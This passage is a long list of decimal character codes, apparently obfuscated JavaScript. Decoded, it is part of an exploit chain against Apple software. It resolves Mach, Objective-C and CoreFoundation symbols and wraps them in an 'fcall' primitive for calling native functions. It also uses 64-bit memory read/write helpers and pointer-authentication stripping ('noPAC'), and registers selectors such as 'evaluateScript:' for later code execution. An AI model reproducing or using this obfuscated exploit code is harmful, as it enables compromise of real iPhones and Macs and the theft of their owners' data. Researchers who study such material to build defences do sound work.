59, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 69, 82, 82, 79, 82, 95, 83, 84, 82, 73, 78, 71, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 101, 114, 114, 111, 114, 95, 115, 116, 114, 105, 110, 103, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 80, 79, 82, 84, 95, 65, 76, 76, 79, 67, 65, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 112, 111, 114, 116, 95, 97, 108, 108, 111, 99, 97, 116, 101, 34, 41, 59, 10, 10, 108, 101, 116, 32, 107, 73, 79, 77, 97, 115, 116, 101, 114, 80, 111, 114, 116, 68, 101, 102, 97, 117, 108, 116, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 107, 73, 79, 77, 97, 115, 116, 101, 114, 80, 111, 114, 116, 68, 101, 102, 97, 117, 108, 116, 34, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 97, 115, 115, 101, 114, 116, 40, 97, 44, 32, 98, 32, 61, 32, 34, 78, 47, 65, 34, 41, 10, 123, 10, 32, 32, 32, 32, 105, 102, 32, 40, 33, 97, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 116, 104, 114, 111, 119, 32, 110, 101, 119, 32, 69, 114, 114, 111, 114, 40, 96, 97, 115, 115, 101, 114, 116, 32, 102, 97, 105, 108, 101, 100, 58, 32, 36, 123, 98, 125, 96, 41, 10, 32, 32, 32, 32, 125, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 69, 82, 82, 79, 82, 40, 97, 41, 32, 123, 32, 116, 104, 114, 111, 119, 32, 110, 101, 119, 32, 69, 114, 114, 111, 114, 40, 97, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 110, 101, 119, 95, 117, 105, 110, 116, 54, 52, 95, 116, 40, 118, 97, 108, 32, 61, 32, 48, 110, 41, 10, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 98, 117, 102, 32, 61, 32, 99, 97, 108, 108, 111, 99, 40, 49, 110, 44, 32, 56, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 98, 117, 102, 44, 32, 118, 97, 108, 41, 59, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 98, 117, 102, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 116, 97, 115, 107, 95, 115, 101, 108, 102, 40, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 48, 120, 50, 48, 51, 110, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 99, 97, 108, 108, 111, 99, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 65, 76, 76, 79, 67, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 108, 108, 111, 99, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 76, 76, 79, 67, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 114, 101, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 82, 69, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 101, 109, 99, 112, 121, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 69, 77, 67, 80, 89, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 101, 109, 115, 101, 116, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 69, 77, 83, 69, 84, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 108, 101, 101, 112, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 76, 69, 69, 80, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 117, 115, 108, 101, 101, 112, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 85, 83, 76, 69, 69, 80, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 99, 109, 112, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 67, 77, 80, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 99, 112, 121, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 67, 80, 89, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 110, 99, 112, 121, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 78, 67, 80, 89, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 110, 112, 114, 105, 110, 116, 102, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 78, 80, 82, 73, 78, 84, 70, 44, 32, 98, 117, 102, 44, 32, 115, 105, 122, 101, 44, 32, 102, 109, 116, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 114, 105, 110, 116, 102, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 82, 73, 78, 84, 70, 44, 32, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 102, 109, 116, 41, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 99, 108, 111, 115, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 76, 79, 83, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 101, 120, 105, 116, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 69, 88, 73, 84, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 103, 101, 116, 99, 104, 97, 114, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 71, 69, 84, 67, 72, 65, 82, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 103, 101, 116, 112, 105, 100, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 71, 69, 84, 80, 73, 68, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 121, 115, 99, 97, 108, 108, 40, 110, 117, 109, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 89, 83, 67, 65, 76, 76, 44, 32, 110, 117, 109, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 118, 109, 95, 97, 108, 108, 111, 99, 97, 116, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 86, 77, 95, 65, 76, 76, 79, 67, 65, 84, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 118, 109, 95, 100, 101, 97, 108, 108, 111, 99, 97, 116, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 86, 77, 95, 68, 69, 65, 76, 76, 79, 67, 65, 84, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 101, 114, 114, 111, 114, 95, 115, 116, 114, 105, 110, 103, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 69, 82, 82, 79, 82, 95, 83, 84, 82, 73, 78, 71, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 112, 111, 114, 116, 95, 97, 108, 108, 111, 99, 97, 116, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 80, 79, 82, 84, 95, 65, 76, 76, 79, 67, 65, 84, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 10, 108, 101, 116, 32, 103, 95, 100, 101, 118, 105, 99, 101, 95, 109, 97, 99, 104, 105, 110, 101, 32, 61, 32, 48, 110, 59, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 103, 101, 116, 95, 100, 101, 118, 105, 99, 101, 95, 109, 97, 99, 104, 105, 110, 101, 40, 41, 10, 123, 10, 32, 32, 32, 32, 105, 102, 32, 40, 103, 95, 100, 101, 118, 105, 99, 101, 95, 109, 97, 99, 104, 105, 110, 101, 32, 61, 61, 32, 48, 110, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 117, 116, 115, 110, 97, 109, 101, 32, 61, 32, 99, 97, 108, 108, 111, 99, 40, 50, 53, 54, 110, 44, 32, 53, 110, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 102, 99, 97, 108, 108, 40, 85, 78, 65, 77, 69, 44, 32, 117, 116, 115, 110, 97, 109, 101, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 103, 95, 100, 101, 118, 105, 99, 101, 95, 109, 97, 99, 104, 105, 110, 101, 32, 61, 32, 117, 116, 115, 110, 97, 109, 101, 32, 43, 32, 40, 50, 53, 54, 110, 32, 42, 32, 52, 110, 41, 59, 10, 32, 32, 32, 32, 125, 10, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 103, 95, 100, 101, 118, 105, 99, 101, 95, 109, 97, 99, 104, 105, 110, 101, 59, 10, 125, 10, 10, 108, 101, 116, 32, 79, 66, 74, 67, 95, 65, 76, 76, 79, 67, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 111, 98, 106, 99, 95, 97, 108, 108, 111, 99, 34, 41, 59, 10, 108, 101, 116, 32, 79, 66, 74, 67, 95, 65, 76, 76, 79, 67, 95, 73, 78, 73, 84, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 111, 98, 106, 99, 95, 97, 108, 108, 111, 99, 95, 105, 110, 105, 116, 34, 41, 59, 10, 108, 101, 116, 32, 79, 66, 74, 67, 95, 71, 69, 84, 67, 76, 65, 83, 83, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 111, 98, 106, 99, 95, 103, 101, 116, 67, 108, 97, 115, 115, 34, 41, 59, 10, 108, 101, 116, 32, 79, 66, 74, 67, 95, 77, 83, 71, 83, 69, 78, 68, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 34, 41, 59, 10, 108, 101, 116, 32, 83, 69, 76, 95, 82, 69, 71, 73, 83, 84, 69, 82, 78, 65, 77, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 34, 41, 59, 10, 10, 108, 101, 116, 32, 67, 70, 68, 73, 67, 84, 73, 79, 78, 65, 82, 89, 67, 82, 69, 65, 84, 69, 77, 85, 84, 65, 66, 76, 69, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 67, 114, 101, 97, 116, 101, 77, 117, 116, 97, 98, 108, 101, 34, 41, 59, 10, 108, 101, 116, 32, 67, 70, 68, 73, 67, 84, 73, 79, 78, 65, 82, 89, 83, 69, 84, 86, 65, 76, 85, 69, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 83, 101, 116, 86, 97, 108, 117, 101, 34, 41, 59, 10, 108, 101, 116, 32, 67, 70, 78, 85, 77, 66, 69, 82, 67, 82, 69, 65, 84, 69, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 78, 117, 109, 98, 101, 114, 67, 114, 101, 97, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 67, 70, 82, 69, 76, 69, 65, 83, 69, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 82, 101, 108, 101, 97, 115, 101, 34, 41, 59, 10, 108, 101, 116, 32, 67, 70, 83, 72, 79, 87, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 83, 104, 111, 119, 34, 41, 59, 10, 108, 101, 116, 32, 67, 70, 83, 84, 82, 73, 78, 71, 67, 82, 69, 65, 84, 69, 67, 79, 80, 89, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 67, 111, 112, 121, 34, 41, 59, 10, 108, 101, 116, 32, 67, 70, 83, 84, 82, 73, 78, 71, 67, 82, 69, 65, 84, 69, 87, 73, 84, 72, 67, 83, 84, 82, 73, 78, 71, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 87, 105, 116, 104, 67, 83, 116, 114, 105, 110, 103, 34, 41, 59, 10, 108, 101, 116, 32, 107, 67, 70, 65, 108, 108, 111, 99, 97, 116, 111, 114, 68, 101, 102, 97, 117, 108, 116, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 107, 67, 70, 65, 108, 108, 111, 99, 97, 116, 111, 114, 68, 101, 102, 97, 117, 108, 116, 34, 41, 46, 110, 111, 80, 65, 67, 40, 41, 41, 59, 10, 108, 101, 116, 32, 107, 67, 70, 83, 116, 114, 105, 110, 103, 69, 110, 99, 111, 100, 105, 110, 103, 85, 84, 70, 56, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 48, 120, 48, 56, 48, 48, 48, 49, 48, 48, 110, 59, 10, 108, 101, 116, 32, 107, 67, 70, 84, 121, 112, 101, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 75, 101, 121, 67, 97, 108, 108, 66, 97, 99, 107, 115, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 107, 67, 70, 84, 121, 112, 101, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 75, 101, 121, 67, 97, 108, 108, 66, 97, 99, 107, 115, 34, 41, 46, 110, 111, 80, 65, 67, 40, 41, 59, 10, 108, 101, 116, 32, 107, 67, 70, 84, 121, 112, 101, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 86, 97, 108, 117, 101, 67, 97, 108, 108, 66, 97, 99, 107, 115, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 107, 67, 70, 84, 121, 112, 101, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 86, 97, 108, 117, 101, 67, 97, 108, 108, 66, 97, 99, 107, 115, 34, 41, 46, 110, 111, 80, 65, 67, 40, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 67, 114, 101, 97, 116, 101, 77, 117, 116, 97, 98, 108, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 68, 73, 67, 84, 73, 79, 78, 65, 82, 89, 67, 82, 69, 65, 84, 69, 77, 85, 84, 65, 66, 76, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 83, 101, 116, 86, 97, 108, 117, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 68, 73, 67, 84, 73, 79, 78, 65, 82, 89, 83, 69, 84, 86, 65, 76, 85, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 78, 117, 109, 98, 101, 114, 67, 114, 101, 97, 116, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 78, 85, 77, 66, 69, 82, 67, 82, 69, 65, 84, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 82, 101, 108, 101, 97, 115, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 82, 69, 76, 69, 65, 83, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 83, 104, 111, 119, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 83, 72, 79, 87, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 67, 111, 112, 121, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 83, 84, 82, 73, 78, 71, 67, 82, 69, 65, 84, 69, 67, 79, 80, 89, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 87, 105, 116, 104, 67, 83, 116, 114, 105, 110, 103, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 83, 84, 82, 73, 78, 71, 67, 82, 69, 65, 84, 69, 87, 73, 84, 72, 67, 83, 84, 82, 73, 78, 71, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 99, 95, 97, 108, 108, 111, 99, 40, 99, 108, 97, 115, 115, 95, 111, 98, 106, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 79, 66, 74, 67, 95, 65, 76, 76, 79, 67, 44, 32, 99, 108, 97, 115, 115, 95, 111, 98, 106, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 99, 95, 97, 108, 108, 111, 99, 95, 105, 110, 105, 116, 40, 99, 108, 97, 115, 115, 95, 111, 98, 106, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 79, 66, 74, 67, 95, 65, 76, 76, 79, 67, 95, 73, 78, 73, 84, 44, 32, 99, 108, 97, 115, 115, 95, 111, 98, 106, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 99, 95, 103, 101, 116, 67, 108, 97, 115, 115, 40, 99, 108, 97, 115, 115, 95, 110, 97, 109, 101, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 79, 66, 74, 67, 95, 71, 69, 84, 67, 76, 65, 83, 83, 44, 32, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 99, 108, 97, 115, 115, 95, 110, 97, 109, 101, 41, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 79, 66, 74, 67, 95, 77, 83, 71, 83, 69, 78, 68, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 99, 115, 116, 114, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 69, 76, 95, 82, 69, 71, 73, 83, 84, 69, 82, 78, 65, 77, 69, 44, 32, 99, 115, 116, 114, 41, 59, 32, 125, 10, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 58, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 110, 105, 116, 87, 105, 116, 104, 84, 97, 114, 103, 101, 116, 95, 115, 101, 108, 101, 99, 116, 111, 114, 95, 111, 98, 106, 101, 99, 116, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 105, 110, 105, 116, 87, 105, 116, 104, 84, 97, 114, 103, 101, 116, 58, 115, 101, 108, 101, 99, 116, 111, 114, 58, 111, 98, 106, 101, 99, 116, 58, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 87, 105, 116, 104, 77, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 87, 105, 116, 104, 77, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 58, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 110, 118, 111, 107, 101, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 105, 110, 118, 111, 107, 101, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 115, 70, 105, 110, 105, 115, 104, 101, 100, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 105, 115, 70, 105, 110, 105, 115, 104, 101, 100, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 109, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 70, 111, 114, 83, 101, 108, 101, 99, 116, 111, 114, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 109, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 70, 111, 114, 83, 101, 108, 101, 99, 116, 111, 114, 58, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 58, 34, 41, 41, 